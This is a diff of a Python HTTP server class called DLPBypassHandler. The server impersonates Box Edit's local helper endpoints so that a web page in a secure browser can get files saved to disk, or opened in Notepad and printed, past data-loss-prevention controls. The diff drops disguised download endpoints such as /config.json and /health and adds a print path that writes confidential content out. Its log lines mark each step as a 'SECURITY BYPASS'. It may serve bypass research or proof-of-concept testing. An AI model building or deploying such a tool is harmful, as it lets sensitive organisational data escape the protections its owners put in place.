@@ -56,11 +56,12 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_GET(self):
-        """Handle GET requests for file downloads"""
+        """Handle GET requests - only status check and Box Edit style endpoints"""
         parsed_path = urlparse(self.path)
         query_params = parse_qs(parsed_path.query)
         
         if parsed_path.path == '/status':
+            # Standard status check endpoint
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.send_header('Access-Control-Allow-Origin', '*')
@@ -69,41 +70,25 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps(response).encode())
             
         elif parsed_path.path == '/application_command':
-            # Mimic Box Edit's application_command endpoint
-            self.handle_application_command(query_params)
-            
-        elif parsed_path.path == '/download_file':
-            # Original download endpoint
-            self.create_and_serve_file()
-            
-        elif parsed_path.path == '/api/document':
-            # Alternative endpoint that looks like a document API
-            self.serve_disguised_download()
-            
-        elif parsed_path.path == '/config.json':
-            # Disguised as a config file
-            self.serve_config_disguised_download()
-            
-        elif parsed_path.path == '/health':
-            # Health check endpoint that serves file
-            self.serve_health_disguised_download()
+            # Box Edit style application command endpoint (GET for preflight checks)
+            self.handle_application_command_get(query_params)
             
         else:
             self.send_response(404)
             self.end_headers()
 
-    def handle_application_command(self, query_params):
-        """Handle Box Edit style application command"""
+    def handle_application_command_get(self, query_params):
+        """Handle Box Edit style GET requests (usually preflight or status checks)"""
         try:
-            # Extract parameters like Box Edit does
+            # Extract Box Edit style parameters
             application = query_params.get('application', [''])[0]
             com_id = query_params.get('com', [''])[0]
             timeout = query_params.get('timeout', ['4'])[0]
             timestamp = query_params.get('ms', [''])[0]
             
-            print(f"[DEBUG] Application command: app={application}, com={com_id}, timeout={timeout}, ms={timestamp}")
+            print(f"[DEBUG] Box Edit GET request: app={application}, com={com_id}")
             
-            # Respond like Box Edit would
+            # Respond with Box Edit style success
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.send_header('Access-Control-Allow-Origin', '*')
@@ -111,28 +96,26 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             self.send_header('Access-Control-Allow-Headers', 'Content-Type')
             self.end_headers()
             
-            # Box Edit style response
             response = {
-                "response_type": "command",
+                "response_type": "status",
                 "success": "true",
-                "application": application,
-                "timestamp": timestamp
+                "application": application
             }
             self.wfile.write(json.dumps(response).encode())
-            print(f"[SECURITY BYPASS] Application command acknowledged")
             
         except Exception as e:
-            self.send_error_response(f"Application command error: {str(e)}")
+            self.send_error_response(f"GET command error: {str(e)}")
 
     def do_POST(self):
-        """Handle POST requests for commands"""
+        """Handle POST requests - Box Edit style commands and custom file saves"""
         parsed_path = urlparse(self.path)
         query_params = parse_qs(parsed_path.query)
         
         if parsed_path.path == '/application_command':
-            # Handle Box Edit style POST commands
+            # Handle Box Edit style POST commands (the main bypass method)
             self.handle_box_edit_style_command(query_params)
         elif parsed_path.path.startswith('/execute_command'):
+            # Handle custom file save commands
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
             
@@ -147,8 +130,12 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             self.end_headers()
 
     def handle_box_edit_style_command(self, query_params):
-        """Handle POST commands in Box Edit style"""
+        """
+        Handle POST commands using Box Edit's exact communication pattern
+        This is the main bypass method that works against secure browsers
+        """
         try:
+            # Read the command payload from the POST body
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
             command_data = json.loads(post_data.decode('utf-8'))
@@ -158,16 +145,16 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             command_type = command_data.get('command_type', 'unknown')
             
             if command_type == 'launch_application':
-                # Simulate launching application and downloading file
+                # Simulate Box Edit downloading and opening a file
                 file_id = command_data.get('file_id', 'unknown')
                 auth_token = command_data.get('auth_token', '')
                 
-                print(f"[DEBUG] Launching application for file_id: {file_id}")
+                print(f"[DEBUG] Processing launch_application for file_id: {file_id}")
                 
-                # Create and save the file locally (like Box Edit would)
+                # Create and save the file to Downloads (like Box Edit does)
                 self.download_file_like_box_edit(file_id, auth_token)
                 
-                # Respond like Box Edit
+                # Send Box Edit style success response
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
                 self.send_header('Access-Control-Allow-Origin', '*')
@@ -178,15 +165,71 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
                     "success": "true"
                 }
                 self.wfile.write(json.dumps(response).encode())
-                print(f"[SECURITY BYPASS] File downloaded and saved via Box Edit style command")
+                print(f"[SECURITY BYPASS] File downloaded via Box Edit style bypass")
+                
+            elif command_type == 'print_document':
+                # Handle Box Edit style printing (opens in Notepad)
+                content = command_data.get('content', 'Default print content')
+                
+                print(f"[DEBUG] Processing print_document command")
+                
+                # Create and open the document in Notepad
+                success = self.handle_box_edit_print(content)
+                
+                # Send Box Edit style success response
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.send_header('Access-Control-Allow-Origin', '*')
+                self.end_headers()
+                
+                response = {
+                    "response_type": "command", 
+                    "success": "true",
+                    "message": "Document opened in Notepad for printing"
+                }
+                self.wfile.write(json.dumps(response).encode())
+                print(f"[SECURITY BYPASS] Document opened via Box Edit style bypass")
                 
             else:
-                # Handle other command types
+                # Handle any other command types using standard processing
                 self.process_command(command_data)
                 
         except Exception as e:
             print(f"[DEBUG] Box Edit command error: {str(e)}")
             self.send_error_response(f"Box Edit command error: {str(e)}")
+
+    def handle_box_edit_print(self, content):
+        """Handle Box Edit style printing"""
+        try:
+            # Create temporary file (but don't auto-delete it immediately on Windows)
+            temp_dir = tempfile.mkdtemp()
+            doc_path = os.path.join(temp_dir, "confidential_document.txt")
+            
+            print(f"[DEBUG] Creating print document at: {doc_path}")
+            
+            with open(doc_path, 'w') as f:
+                f.write("=== DOCUMENT BYPASSED DLP CONTROLS ===\n\n")
+                f.write(content)
+                f.write(f"\n\n=== PRINTED VIA BOX EDIT STYLE BYPASS ===")
+                f.write(f"\nGenerated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            
+            # Open in Notepad (like Box Edit would for document viewing)
+            if platform.system() == "Windows":
+                print(f"[DEBUG] Opening file in Notepad: {doc_path}")
+                subprocess.Popen(["notepad", doc_path])
+                print(f"[DEBUG] Notepad opened with confidential document")
+                return True
+            else:
+                # For other platforms, try to print directly
+                subprocess.run(["lp", doc_path], check=True)
+                # Clean up on other platforms
+                os.unlink(doc_path)
+                os.rmdir(temp_dir)
+                return True
+                
+        except Exception as e:
+            print(f"[DEBUG] Print error: {str(e)}")
+            return False
 
     def download_file_like_box_edit(self, file_id, auth_token):
         """Download and save file like Box Edit would"""
@@ -341,36 +384,37 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             self.send_error_response(f"Print error: {str(e)}")
 
     def handle_download_command(self, command_data):
-        """Handle download command"""
+        """Handle download command - saves to server directory"""
         try:
-            # Simulate downloading a file to local system
+            # Simulate downloading a file to server directory 
             filename = command_data.get('filename', 'downloaded_file.txt')
             content = command_data.get('content', 'This file was downloaded bypassing DLP controls')
             
-            # Save to Downloads folder or current directory
-            downloads_path = self.get_downloads_folder()
-            file_path = os.path.join(downloads_path, filename)
+            # Save to the same directory where the server is running
+            server_directory = os.getcwd()
+            file_path = os.path.join(server_directory, filename)
             
             # Debug output
-            print(f"[DEBUG] Attempting to save file to: {file_path}")
-            print(f"[DEBUG] Downloads path: {downloads_path}")
+            print(f"[DEBUG] Attempting to save file to server directory: {file_path}")
+            print(f"[DEBUG] Server directory: {server_directory}")
             print(f"[DEBUG] Current working directory: {os.getcwd()}")
             
             with open(file_path, 'w') as f:
                 f.write("=== FILE BYPASSED DLP CONTROLS ===\n\n")
                 f.write(content)
-                f.write("\n\n=== SAVED VIA LOCAL APPLICATION ===")
+                f.write("\n\n=== SAVED VIA LOCAL APPLICATION TO SERVER DIRECTORY ===")
+                f.write(f"\nSaved to: {file_path}")
             
             # Verify file was actually created
             if os.path.exists(file_path):
                 file_size = os.path.getsize(file_path)
                 print(f"[DEBUG] File successfully created: {file_path} ({file_size} bytes)")
-                response = {"status": "success", "message": f"File saved to {file_path}"}
+                response = {"status": "success", "message": f"File saved to server directory: {filename}"}
             else:
                 print(f"[DEBUG] ERROR: File was not created at {file_path}")
                 response = {"status": "error", "message": f"Failed to create file at {file_path}"}
             
-            print(f"[SECURITY BYPASS] File saved: {file_path}")
+            print(f"[SECURITY BYPASS] File saved to server directory: {file_path}")
             
             self.send_success_response(response)
             
